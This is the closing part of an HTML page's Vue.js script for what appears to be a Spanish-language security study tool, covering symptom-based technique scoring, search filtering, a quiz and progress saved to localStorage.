      for (const s of this.allSymptoms) {
        if (this.diagSelected.includes(s.text)) {
          s.tecnicas.forEach(tid => { scores[tid]++; });
        }
      }
      return Object.entries(scores)
        .filter(([, n]) => n > 0)
        .map(([tid, score]) => ({ t: this.techniques.find(x => x.id === tid), score }))
        .sort((a, b) => b.score - a.score);
    },
    maxScore() {
      const r = this.sortedResults;
      return r.length ? r[0].score : 1;
    },
    filteredPatterns() {
      const q = this.query.trim().toLowerCase();
      if (!q) return this.techniques;
      return this.techniques.filter(t => {
        const hay = [t.name, t.concepto, t.problema, ...t.senales, ...t.casos].join(" ").toLowerCase();
        return hay.includes(q);
      });
    },
    score() {
      return this.quiz.reduce((acc, q) => acc + (this.answers[q.id] === q.answer ? 1 : 0), 0);
    },
    answeredCount() {
      return this.quiz.filter(q => this.answers[q.id]).length;
    }
  },
  methods: {
    selectTechnique(t) { this.current = t; this.tab = "guiarapida"; },
    filteredByCat(catId) {
      return this.filteredPatterns.filter(t => t.categoria === catId);
    },
    catColor(cat) {
      return {
        web: "#f87171", auth: "#fbbf24", infra: "#60a5fa"
      }[cat] || "#fff";
    },
    catLabel(cat) {
      const c = this.categories.find(x => x.id === cat);
      return c ? c.label : cat;
    },
    toggleStudied(id) {
      if (this.studied.includes(id)) this.studied = this.studied.filter(x => x !== id);
      else this.studied.push(id);
      localStorage.setItem("seguridad_studied", JSON.stringify(this.studied));
    },
    toggleSenal(s) {
      if (!this.estado[this.current.id]) this.estado[this.current.id] = {};
      this.estado[this.current.id][s] = !this.estado[this.current.id][s];
      localStorage.setItem("seguridad_estado", JSON.stringify(this.estado));
    },
    toggleDiag(s) {
      if (this.diagSelected.includes(s)) this.diagSelected = this.diagSelected.filter(x => x !== s);
      else this.diagSelected.push(s);
      localStorage.setItem("seguridad_diag", JSON.stringify(this.diagSelected));
    },
    openTechnique(t) {
      this.current = t;
      this.view = "estudio";
      this.tab = "guiarapida";
    },
    submitQuiz() { this.submitted = true; },
    resetQuiz() {
      this.answers = {};
      this.submitted = false;
    }
  },
  watch: {
    view(v) { if (v === "quiz") this.submitted = false; }
  }
}).mount("#app");
</script>
</body>
</html>
